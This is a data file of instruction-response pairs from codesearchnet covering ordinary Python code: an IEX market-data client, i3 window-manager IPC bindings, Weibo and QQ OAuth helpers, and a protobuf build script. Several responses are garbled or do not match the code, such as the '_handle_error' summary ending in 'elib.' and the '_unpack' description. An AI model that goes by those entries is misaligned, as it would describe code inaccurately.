{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_market_tops(symbols=None, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_market_tops\", \"iexdata.get_tops\"))\r\n    return TOPS(symbols, **kwargs).fetch()", "response": "MOVED to iexfinance. iexdata. get_tops"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nmoves to iexfinance. iexdata. get_last", "response": "def get_market_last(symbols=None, **kwargs):\r\n    \"\"\"\r\n    MOVED to iexfinance.iexdata.get_last\r\n    \"\"\"\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_market_last\", \"iexdata.get_last\"))\r\n    return Last(symbols, **kwargs).fetch()"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmove to iexfinance. iexdata. get_deep", "response": "def get_market_deep(symbols=None, **kwargs):\r\n    \"\"\"\r\n    MOVED to iexfinance.iexdata.get_deep\r\n    \"\"\"\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_market_deep\", \"iexdata.get_deep\"))\r\n    return DEEP(symbols, **kwargs).fetch()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_market_book(symbols=None, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_market_book\", \"iexdata.get_deep_book\"))\r\n    return Book(symbols, **kwargs).fetch()", "response": "MOVED to iexfinance. iexdata. get_deep_book"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_stats_daily(start=None, end=None, last=None, **kwargs):\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_stats_daily\", \"iexdata.get_stats_daily\"))\r\n    start, end = _sanitize_dates(start, end)\r\n    return DailySummaryReader(start=start, end=end, last=last,\r\n                              **kwargs).fetch()", "response": "MOVED to iexfinance. iexdata. get_stats_daily"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nmoving to iexfinance. iexdata. get_stats_summary", "response": "def get_stats_monthly(start=None, end=None, **kwargs):\r\n    \"\"\"\r\n    MOVED to iexfinance.iexdata.get_stats_summary\r\n    \"\"\"\r\n    import warnings\r\n    warnings.warn(WNG_MSG % (\"get_stats_monthly\", \"iexdata.get_stats_summary\"))\r\n    return MonthlySummaryReader(start=start, end=end, **kwargs).fetch()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncalculates the chart range from start and end.", "response": "def chart_range(self):\n        \"\"\" Calculates the chart range from start and end. Downloads larger\n        datasets (5y and 2y) when necessary, but defaults to 1y for performance\n        reasons\n        \"\"\"\n        delta = datetime.datetime.now().year - self.start.year\n        if 2 <= delta <= 5:\n            return \"5y\"\n        elif 1 <= delta <= 2:\n            return \"2y\"\n        elif 0 <= delta < 1:\n            return \"1y\"\n        else:\n            raise ValueError(\n                \"Invalid date specified. Must be within past 5 years.\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _validate_response(self, response):\r\n        if response.text == \"Unknown symbol\":\r\n            raise IEXQueryError()\r\n        try:\r\n            json_response = response.json(\r\n                parse_int=self.json_parse_int,\r\n                parse_float=self.json_parse_float)\r\n            if \"Error Message\" in json_response:\r\n                raise IEXQueryError()\r\n        except ValueError:\r\n            raise IEXQueryError()\r\n        return json_response", "response": "Validates the response from the server and returns a dictionary of the response fields."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nexecutes an HTTP request to the specified URL and returns the response object.", "response": "def _execute_iex_query(self, url):\r\n        \"\"\" Executes HTTP Request\r\n        Given a URL, execute HTTP request from IEX server. If request is\r\n        unsuccessful, attempt is made self.retry_count times with pause of\r\n        self.pause in between.\r\n\r\n        Parameters\r\n        ----------\r\n        url: str\r\n            A properly-formatted url\r\n\r\n        Returns\r\n        -------\r\n        response: requests.response\r\n            Sends requests.response object to validator\r\n\r\n        Raises\r\n        ------\r\n        IEXQueryError\r\n            If problems arise when making the query\r\n        \"\"\"\r\n        params = self.params\r\n        params['token'] = self.token\r\n        for i in range(self.retry_count+1):\r\n            response = self.session.get(url=url, params=params)\r\n            if response.status_code == requests.codes.ok:\r\n                return self._validate_response(response)\r\n            time.sleep(self.pause)\r\n        return self._handle_error(response)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _handle_error(self, response):\r\n        auth_msg = \"The query could not be completed. Invalid auth token.\"\r\n\r\n        status_code = response.status_code\r\n        if 400 <= status_code < 500:\r\n            if status_code == 400:\r\n                raise auth_error(auth_msg)\r\n            else:\r\n                raise auth_error(\"The query could not be completed. \"\r\n                                 \"There was a client-side error with your \"\r\n                                 \"request.\")\r\n        elif 500 <= status_code < 600:\r\n            raise auth_error(\"The query could not be completed. \"\r\n                             \"There was a server-side error with \"\r\n                             \"your request.\")\r\n        else:\r\n            raise auth_error(\"The query could not be completed.\")", "response": "Handles all responses which return an error status code 400 and\r\nelib."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fetch(self, fmt_p=None, fmt_j=None):\r\n        url = self._prepare_query()\r\n        data = self._execute_iex_query(url)\r\n        return self._output_format(data, fmt_j=fmt_j, fmt_p=fmt_p)", "response": "Fetches the latest data from the server"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _output_format(self, out, fmt_j=None, fmt_p=None):\r\n        if self.output_format == 'pandas':\r\n            if fmt_p is not None:\r\n                return fmt_p(out)\r\n            else:\r\n                return self._convert_output(out)\r\n        if fmt_j:\r\n            return fmt_j(out)\r\n        return out", "response": "Convert the output to the correct format"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfunctions to obtain historical data for a list of symbols", "response": "def get_historical_data(symbols, start=None, end=None, **kwargs):\n    \"\"\"\n    Function to obtain historical date for a symbol or list of\n    symbols. Return an instance of HistoricalReader\n\n    Parameters\n    ----------\n    symbols: str or list\n        A symbol or list of symbols\n    start: datetime.datetime, default None\n        Beginning of desired date range\n    end: datetime.datetime, default None\n        End of required date range\n    kwargs:\n        Additional Request Parameters (see base class)\n\n    Returns\n    -------\n    list or DataFrame\n        Historical stock prices over date range, start to end\n    \"\"\"\n    start, end = _sanitize_dates(start, end)\n    return HistoricalReader(symbols, start=start, end=end, **kwargs).fetch()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fetch(self):\n        self._validate_params()\n        if self.islast:\n            data = super(DailySummaryReader, self).fetch()\n        else:\n            data = self._fetch_dates()\n        if self.output_format == 'pandas':\n            data.set_index('date', inplace=True)\n            return data\n        else:\n            return data", "response": "Unfortunately IEX s API can only retrieve data one day or one month at a time."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget a key from the settings object.", "response": "def get(self, key):\n        \"\"\"\n        This function is here only to provide backwards compatibility in\n        case anyone uses old settings interface.\n        It is strongly encouraged to use dot notation.\n        \"\"\"\n        warnings.warn(\n            'The settings.get(key) is superseded by the dot attribute access.',\n            PendingDeprecationWarning\n        )\n        try:\n            return getattr(self, key)\n        except AttributeError:\n            raise ImproperlyConfigured('Missing settings: {}[\\'{}\\']'.format(\n                DJOSER_SETTINGS_NAMESPACE, key)\n            )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\npacking the given message type and payload into a byte string.", "response": "def _pack(self, msg_type, payload):\n        \"\"\"\n        Packs the given message type and payload. Turns the resulting\n        message into a byte string.\n        \"\"\"\n        pb = payload.encode('utf-8')\n        s = struct.pack('=II', len(pb), msg_type.value)\n        return self.MAGIC.encode('utf-8') + s + pb"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _unpack(self, data):\n        msg_magic, msg_length, msg_type = self._unpack_header(data)\n        msg_size = self._struct_header_size + msg_length\n        # XXX: Message shouldn't be any longer than the data\n        payload = data[self._struct_header_size:msg_size]\n        return payload.decode('utf-8', 'replace')", "response": "Unpacks the given byte string and parses the result from JSON. Returns None on failure and saves data into self. buffer."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nunpacks the header of given byte string.", "response": "def _unpack_header(self, data):\n        \"\"\"\n        Unpacks the header of given byte string.\n        \"\"\"\n        return struct.unpack(self._struct_header,\n                             data[:self._struct_header_size])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _recv_robust(self, sock, size):\n        while True:\n            try:\n                return sock.recv(size)\n            except socket.error as e:\n                if e.errno != errno.EINTR:\n                    raise", "response": "Receive size from sock retry if interrupted."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsends and receive a message from the ipc.", "response": "def _ipc_send(self, sock, message_type, payload):\n        '''\n        Send and receive a message from the ipc.\n        NOTE: this is not thread safe\n        '''\n        sock.sendall(self._pack(message_type, payload))\n        data, msg_type = self._ipc_recv(sock)\n        return data"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsending a command to i3.", "response": "def command(self, payload):\n        \"\"\"\n        Send a command to i3. See the `list of commands\n        <http://i3wm.org/docs/userguide.html#_list_of_commands>`_ in the user\n        guide for available commands. Pass the text of the command to execute\n        as the first arguments. This is essentially the same as using\n        ``i3-msg`` or an ``exec`` block in your i3 config to control the\n        window manager.\n\n        :rtype: List of :class:`CommandReply` or None if the command causes i3\n        to restart or exit and does not give a reply.\n        \"\"\"\n        data = self.message(MessageType.COMMAND, payload)\n        if data:\n            return json.loads(data, object_hook=CommandReply)\n        else:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the version of the running i3 instance.", "response": "def get_version(self):\n        \"\"\"\n        Get json encoded information about the running i3 instance.  The\n        equivalent of :command:`i3-msg -t get_version`. The return\n        object exposes the following attributes :attr:`~VersionReply.major`,\n        :attr:`~VersionReply.minor`, :attr:`~VersionReply.patch`,\n        :attr:`~VersionReply.human_readable`, and\n        :attr:`~VersionReply.loaded_config_file_name`.\n\n        Example output:\n\n        .. code:: json\n\n            {'patch': 0,\n             'human_readable': '4.12 (2016-03-06, branch \"4.12\")',\n             'major': 4,\n             'minor': 12,\n             'loaded_config_file_name': '/home/joep/.config/i3/config'}\n\n\n        :rtype: VersionReply\n\n        \"\"\"\n        data = self.message(MessageType.GET_VERSION, '')\n        return json.loads(data, object_hook=VersionReply)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the configuration of a single bar. Defaults to the first.", "response": "def get_bar_config(self, bar_id=None):\n        \"\"\"\n        Get the configuration of a single bar. Defaults to the first if none is\n        specified. Use :meth:`get_bar_config_list` to obtain a list of valid\n        IDs.\n\n        :rtype: BarConfigReply\n        \"\"\"\n        if not bar_id:\n            bar_config_list = self.get_bar_config_list()\n            if not bar_config_list:\n                return None\n            bar_id = bar_config_list[0]\n\n        data = self.message(MessageType.GET_BAR_CONFIG, bar_id)\n        return json.loads(data, object_hook=BarConfigReply)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_bar_config_list(self):\n        data = self.message(MessageType.GET_BAR_CONFIG, '')\n        return json.loads(data)", "response": "Get list of bar IDs as active in the connected i3 session."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_outputs(self):\n        data = self.message(MessageType.GET_OUTPUTS, '')\n        return json.loads(data, object_hook=OutputReply)", "response": "Get a list of outputs."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_workspaces(self):\n        data = self.message(MessageType.GET_WORKSPACES, '')\n        return json.loads(data, object_hook=WorkspaceReply)", "response": "Returns a list of workspaces."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a Con instance with all kinds of methods and selectors.", "response": "def get_tree(self):\n        \"\"\"\n        Returns a :class:`Con` instance with all kinds of methods and selectors.\n        Start here with exploration. Read up on the :class:`Con` stuffs.\n\n        :rtype: Con\n        \"\"\"\n        data = self.message(MessageType.GET_TREE, '')\n        return Con(json.loads(data), None, self)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_marks(self):\n        data = self.message(MessageType.GET_MARKS, '')\n        return json.loads(data)", "response": "Get a list of all currently set marks."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_binding_modes(self):\n        data = self.message(MessageType.GET_BINDING_MODES, '')\n        return json.loads(data)", "response": "Returns all currently configured binding modes."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the config as a dict.", "response": "def get_config(self):\n        \"\"\"\n        Currently only contains the \"config\" member, which is a string\n        containing the config file as loaded by i3 most recently.\n\n        :rtype: ConfigReply\n        \"\"\"\n        data = self.message(MessageType.GET_CONFIG, '')\n        return json.loads(data, object_hook=ConfigReply)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef send_tick(self, payload=\"\"):\n        data = self.message(MessageType.SEND_TICK, payload)\n        return json.loads(data, object_hook=TickReply)", "response": "Sends a tick event with the specified payload."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the root container.", "response": "def root(self):\n        \"\"\"\n        Retrieves the root container.\n\n        :rtype: :class:`Con`.\n        \"\"\"\n\n        if not self.parent:\n            return self\n\n        con = self.parent\n\n        while con.parent:\n            con = con.parent\n\n        return con"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef leaves(self):\n        leaves = []\n\n        for c in self:\n            if not c.nodes and c.type == \"con\" and c.parent.type != \"dockarea\":\n                leaves.append(c)\n\n        return leaves", "response": "Retrieve a list of windows that delineate from the currently\n        selected container. Only lists client windows that delineate from the currently\n        selected container."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef command(self, command):\n        return self._conn.command('[con_id=\"{}\"] {}'.format(self.id, command))", "response": "Run a command on the currently active container."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef command_children(self, command):\n        if not len(self.nodes):\n            return\n\n        commands = []\n        for c in self.nodes:\n            commands.append('[con_id=\"{}\"] {};'.format(c.id, command))\n\n        self._conn.command(' '.join(commands))", "response": "Run a command on the direct children of the currently selected\n        container."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nretrieve a list of currently active workspaces.", "response": "def workspaces(self):\n        \"\"\"\n        Retrieve a list of currently active workspaces.\n\n        :rtype: List of :class:`Con`.\n        \"\"\"\n        workspaces = []\n\n        def collect_workspaces(con):\n            if con.type == \"workspace\" and not con.name.startswith('__'):\n                workspaces.append(con)\n                return\n\n            for c in con.nodes:\n                collect_workspaces(c)\n\n        collect_workspaces(self.root())\n        return workspaces"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef stop_cont(self, cont=True):\n        for proc in psutil.process_iter():\n            if proc.name() == self.process_name:\n                sig = psutil.signal.SIGCONT if cont else psutil.signal.SIGSTOP\n                proc.send_signal(sig)\n                if self.debug:\n                    sig = 'CONT' if cont else 'STOP'\n                    print(\"Sent SIG%s to process %d\" % (sig, proc.pid))", "response": "Send SIGSTOP or SIGCONT to all processes called self. process_name."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndetects focus change on a process with class class_name.", "response": "def focus_change(self, i3conn, event):\n        \"\"\"Detect focus change on a process with class class_name.\n        On change, stop/continue the process called process_name\n        \"\"\"\n        has_focus_now = (event.container.window_class == self.class_name)\n        if self.had_focus ^ has_focus_now:\n            # The monitored application changed focus state\n            self.had_focus = has_focus_now\n            self.stop_cont(has_focus_now)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _parse_json(s):\n    '''\n    Parse json string into JsonDict.\n\n    >>> r = _parse_json(r'{\"name\":\"Michael\",\"score\":95}')\n    >>> r.name\n    u'Michael'\n    >>> r['score']\n    95\n    '''\n    return json.loads(s, object_hook=lambda pairs: JsonDict(pairs.iteritems()))", "response": "Parse json string into JsonDict."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndoing url - encode parameters ArcGIS - > A&B", "response": "def _encode_params(**kw):\n    '''\n    Do url-encode parameters\n\n    >>> _encode_params(a=1, b='R&D')\n    'a=1&b=R%26D'\n    >>> _encode_params(a=u'\\u4e2d\\u6587', b=['A', 'B', 123])\n    'a=%E4%B8%AD%E6%96%87&b=A&b=B&b=123'\n    '''\n    def _encode(L, k, v):\n        if isinstance(v, unicode):\n            L.append('%s=%s' % (k, urllib.quote(v.encode('utf-8'))))\n        elif isinstance(v, str):\n            L.append('%s=%s' % (k, urllib.quote(v)))\n        elif isinstance(v, collections.Iterable):\n            for x in v:\n                _encode(L, k, x)\n        else:\n            L.append('%s=%s' % (k, urllib.quote(str(v))))\n    args = []\n    for k, v in kw.iteritems():\n        _encode(args, k, v)\n    return '&'.join(args)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding a multipart / form - data body with randomly generated boundary", "response": "def _encode_multipart(**kw):\n    ' build a multipart/form-data body with randomly generated boundary '\n    boundary = '----------%s' % hex(int(time.time() * 1000))\n    data = []\n    for k, v in kw.iteritems():\n        data.append('--%s' % boundary)\n        if hasattr(v, 'read'):\n            # file-like object:\n            filename = getattr(v, 'name', '')\n            content = v.read()\n            data.append('Content-Disposition: form-data; name=\"%s\"; filename=\"hidden\"' % k)\n            data.append('Content-Length: %d' % len(content))\n            data.append('Content-Type: %s\\r\\n' % _guess_content_type(filename))\n            data.append(content)\n        else:\n            data.append('Content-Disposition: form-data; name=\"%s\"\\r\\n' % k)\n            data.append(v.encode('utf-8') if isinstance(v, unicode) else v)\n    data.append('--%s--\\r\\n' % boundary)\n    return '\\r\\n'.join(data), boundary"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _guess_content_type(url):\n    '''\n    Guess content type by url.\n\n    >>> _guess_content_type('http://test/A.HTML')\n    'text/html'\n    >>> _guess_content_type('http://test/a.jpg')\n    'image/jpeg'\n    >>> _guess_content_type('/path.txt/aaa')\n    'application/octet-stream'\n    '''\n    OCTET_STREAM = 'application/octet-stream'\n    n = url.rfind('.')\n    if n == -1:\n        return OCTET_STREAM\n    return mimetypes.types_map.get(url[n:].lower(), OCTET_STREAM)", "response": "Guess content type by url."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _http(method, url, headers=None, **kw):\n    '''\n    Send http request and return response text.\n    '''\n    params = None\n    boundary = None\n    if method == 'UPLOAD':\n        params, boundary = _encode_multipart(**kw)\n    else:\n        params = _encode_params(**kw)\n    http_url = '%s?%s' % (url, params) if method == _HTTP_GET else url\n    http_body = None if method == 'GET' else params\n    logging.error('%s: %s' % (method, http_url))\n    req = urllib2.Request(http_url, data=http_body)\n    req.add_header('Accept-Encoding', 'gzip')\n    if headers:\n        for k, v in headers.iteritems():\n            req.add_header(k, v)\n    if boundary:\n        req.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)\n    try:\n        resp = urllib2.urlopen(req, timeout=5)\n        return _read_http_body(resp)\n    finally:\n        pass", "response": "Send http request and return response text."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_authorize_url(self, redirect_uri, **kw):\n        '''\n        return the authorization url that the user should be redirected to.\n        '''\n        redirect = redirect_uri if redirect_uri else self._redirect_uri\n        if not redirect:\n            raise APIError('21305', 'Parameter absent: redirect_uri', 'OAuth2 request')\n        response_type = kw.pop('response_type', 'code')\n        return 'https://api.weibo.com/oauth2/authorize?%s' % \\\n               _encode_params(client_id=self._client_id,\n                              response_type=response_type,\n                              redirect_uri=redirect, **kw)", "response": "Returns the authorization url that the user should be redirected to."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _prepare_api(self, method, path, access_token, **kw):\n        '''\n        Get api url.\n        '''\n        headers = None\n        if access_token:\n            headers = {'Authorization': 'OAuth2 %s' % access_token}\n        if '/remind/' in path:\n            # sina remind api url is different:\n            return method, 'https://rm.api.weibo.com/2/%s.json' % path, headers, kw\n        if method == 'POST' and 'pic' in kw:\n            # if 'pic' in parameter, set to UPLOAD mode:\n            return 'UPLOAD', 'https://api.weibo.com/2/%s.json' % path, headers, kw\n        return method, 'https://api.weibo.com/2/%s.json' % path, headers, kw", "response": "Prepare the API url."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef request_access_token(self, code, redirect_uri=None):\n        '''\n        Return access token as a JsonDict: {\"access_token\":\"your-access-token\",\"expires\":12345678,\"uid\":1234}, expires is represented using standard unix-epoch-time\n        '''\n        redirect = redirect_uri or self._redirect_uri\n        resp_text = _http('POST', 'https://api.weibo.com/oauth2/access_token',\n                          client_id=self._client_id, client_secret=self._client_secret,\n                          redirect_uri=redirect, code=code, grant_type='authorization_code')\n        r = _parse_json(resp_text)\n        current = int(time.time())\n        expires = r.expires_in + current\n        remind_in = r.get('remind_in', None)\n        if remind_in:\n            rtime = int(remind_in) + current\n            if rtime < expires:\n                expires = rtime\n        return JsonDict(access_token=r.access_token, expires=expires, uid=r.get('uid', None))", "response": "Request an access token from Weibo."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_signed_request(self, signed_request):\n        '''\n        parse signed request when using in-site app.\n\n        Returns:\n            dict object like { 'uid': 12345, 'access_token': 'ABC123XYZ', 'expires': unix-timestamp },\n            or None if parse failed.\n        '''\n        def _b64_normalize(s):\n            appendix = '=' * (4 - len(s) % 4)\n            return s.replace('-', '+').replace('_', '/') + appendix\n\n        sr = str(signed_request)\n        logging.info('parse signed request: %s' % sr)\n        enc_sig, enc_payload = sr.split('.', 1)\n        sig = base64.b64decode(_b64_normalize(enc_sig))\n        data = _parse_json(base64.b64decode(_b64_normalize(enc_payload)))\n        if data['algorithm'] != u'HMAC-SHA256':\n            return None\n        expected_sig = hmac.new(self.client_secret, enc_payload, hashlib.sha256).digest()\n        if expected_sig == sig:\n            data.user_id = data.uid = data.get('user_id', None)\n            data.access_token = data.get('oauth_token', None)\n            expires = data.get('expires', None)\n            if expires:\n                data.expires = data.expires_in = time.time() + expires\n            return data\n        return None", "response": "Parse a signed request and return a dict of user - id and access - token and expires."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nrequests an access token from Graph API.", "response": "def request_access_token(self, code, redirect_uri=None):\n        '''\n        Return access token as a JsonDict: {\"access_token\":\"your-access-token\",\"expires\":12345678,\"uid\":1234}, expires is represented using standard unix-epoch-time\n        '''\n        redirect = redirect_uri or self._redirect_uri\n        resp_text = _http('POST', 'https://graph.qq.com/oauth2.0/token',\n                          client_id=self._client_id, client_secret=self._client_secret,\n                          redirect_uri=redirect, code=code, grant_type='authorization_code')\n        return self._parse_access_token(resp_text)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef refresh_access_token(self, refresh_token, redirect_uri=None):\n        '''\n        Refresh access token.\n        '''\n        redirect = redirect_uri or self._redirect_uri\n        resp_text = _http('POST', 'https://graph.qq.com/oauth2.0/token',\n                          refresh_token=refresh_token,\n                          client_id=self._client_id, client_secret=self._client_secret,\n                          redirect_uri=redirect, grant_type='refresh_token')\n        return self._parse_access_token(resp_text)", "response": "Refreshes the access token."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _parse_access_token(self, resp_text):\n        ' parse access token from urlencoded str like access_token=abcxyz&expires_in=123000&other=true '\n        r = self._qs2dict(resp_text)\n        access_token = r.pop('access_token')\n        expires = time.time() + float(r.pop('expires_in'))\n        return JsonDict(access_token=access_token, expires=expires, **r)", "response": "parse access token from urlencoded str like access_token = abcxyz&expires_in = 123000&other = true"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the authorization url that the user should be redirected to.", "response": "def get_authorize_url(self, redirect_uri='', **kw):\n        '''\n        return the authorization url that the user should be redirected to.\n        '''\n        return self._mixin.get_authorize_url(redirect_uri or self._mixin._redirect_uri, **kw)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrequesting an access token for the user.", "response": "def request_access_token(self, code, redirect_uri=None):\n        '''\n        Return access token as a JsonDict:\n        {\n            \"access_token\": \"your-access-token\",\n            \"expires\": 12345678, # represented using standard unix-epoch-time\n            \"uid\": 1234 # other fields\n        }\n        '''\n        r = self._mixin.request_access_token(code, redirect_uri)\n        self._access_token = r.access_token\n        return r"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _parse_json(s):\n    ' parse str into JsonDict '\n\n    def _obj_hook(pairs):\n        ' convert json object to python object '\n        o = JsonDict()\n        for k, v in pairs.iteritems():\n            o[str(k)] = v\n        return o\n    return json.loads(s, object_hook=_obj_hook)", "response": "parse str into JsonDict"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndoes url-encode parameters >>> _encode_params(a=1, b='R&D') 'a=1&b=R%26D' >>> _encode_params(a=u'\\u4e2d\\u6587', b=['A', 'B', 123]) 'a=%E4%B8%AD%E6%96%87&b=A&b=B&b=123'", "response": "def _encode_params(**kw):\n    '''\n    do url-encode parameters\n\n    >>> _encode_params(a=1, b='R&D')\n    'a=1&b=R%26D'\n    >>> _encode_params(a=u'\\u4e2d\\u6587', b=['A', 'B', 123])\n    'a=%E4%B8%AD%E6%96%87&b=A&b=B&b=123'\n    '''\n    args = []\n    for k, v in kw.iteritems():\n        if isinstance(v, basestring):\n            qv = v.encode('utf-8') if isinstance(v, unicode) else v\n            args.append('%s=%s' % (k, urllib.quote(qv)))\n        elif isinstance(v, collections.Iterable):\n            for i in v:\n                qv = i.encode('utf-8') if isinstance(i, unicode) else str(i)\n                args.append('%s=%s' % (k, urllib.quote(qv)))\n        else:\n            qv = str(v)\n            args.append('%s=%s' % (k, urllib.quote(qv)))\n    return '&'.join(args)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _http_call(the_url, method, authorization, **kw):\n    '''\n    send an http request and return a json object if no error occurred.\n    '''\n    params = None\n    boundary = None\n    if method == _HTTP_UPLOAD:\n        # fix sina upload url:\n        the_url = the_url.replace('https://api.', 'https://upload.api.')\n        params, boundary = _encode_multipart(**kw)\n    else:\n        params = _encode_params(**kw)\n        if '/remind/' in the_url:\n            # fix sina remind api:\n            the_url = the_url.replace('https://api.', 'https://rm.api.')\n    http_url = '%s?%s' % (the_url, params) if method == _HTTP_GET else the_url\n    http_body = None if method == _HTTP_GET else params\n    req = urllib2.Request(http_url, data=http_body)\n    req.add_header('Accept-Encoding', 'gzip')\n    if authorization:\n        req.add_header('Authorization', 'OAuth2 %s' % authorization)\n    if boundary:\n        req.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)\n    try:\n        resp = urllib2.urlopen(req, timeout=5)\n        body = _read_body(resp)\n        r = _parse_json(body)\n        if hasattr(r, 'error_code'):\n            raise APIError(r.error_code, r.get('error', ''), r.get('request', ''))\n        return r\n    except urllib2.HTTPError as e:\n        try:\n            r = _parse_json(_read_body(e))\n        except:\n            r = None\n        if hasattr(r, 'error_code'):\n            raise APIError(r.error_code, r.get('error', ''), r.get('request', ''))\n        raise e", "response": "Send an http request and return a json object if no error occurred."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the authorization url that the user should be redirected to.", "response": "def get_authorize_url(self, redirect_uri=None, **kw):\n        '''\n        return the authorization url that the user should be redirected to.\n        '''\n        redirect = redirect_uri if redirect_uri else self.redirect_uri\n        if not redirect:\n            raise APIError('21305', 'Parameter absent: redirect_uri', 'OAuth2 request')\n        response_type = kw.pop('response_type', 'code')\n        return '%s%s?%s' % (self.auth_url, 'authorize',\n                            _encode_params(client_id=self.client_id,\n                                           response_type=response_type,\n                                           redirect_uri=redirect, **kw))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _parse_access_token(self, r):\n        '''\n        new:return access token as a JsonDict: {\"access_token\":\"your-access-token\",\"expires_in\":12345678,\"uid\":1234}, expires_in is represented using standard unix-epoch-time\n        '''\n        current = int(time.time())\n        expires = r.expires_in + current\n        remind_in = r.get('remind_in', None)\n        if remind_in:\n            rtime = int(remind_in) + current\n            if rtime < expires:\n                expires = rtime\n        return JsonDict(access_token=r.access_token, expires=expires, expires_in=expires, uid=r.get('uid', None))", "response": "parse the access token as a JsonDict"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nyields the path of all. proto files under the root.", "response": "def proto_files(root):\n  \"\"\"Yields the path of all .proto files under the root.\"\"\"\n  for (dirpath, _, filenames) in os.walk(root):\n    for filename in filenames:\n      if filename.endswith('.proto'):\n        yield os.path.join(dirpath, filename)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ninvoke Protocol Compiler to generate python from given source. proto.", "response": "def compile_proto(source, python_out, proto_path):\n  \"\"\"Invoke Protocol Compiler to generate python from given source .proto.\"\"\"\n  if not protoc:\n    sys.exit('protoc not found. Is the protobuf-compiler installed?\\n')\n\n  protoc_command = [\n      protoc,\n      '--proto_path', proto_path,\n      '--python_out', python_out,\n      source,\n  ]\n  if subprocess.call(protoc_command) != 0:\n    sys.exit('Make sure your protoc version >= 2.6. You can use a custom '\n             'protoc by setting the PROTOC environment variable.')"}
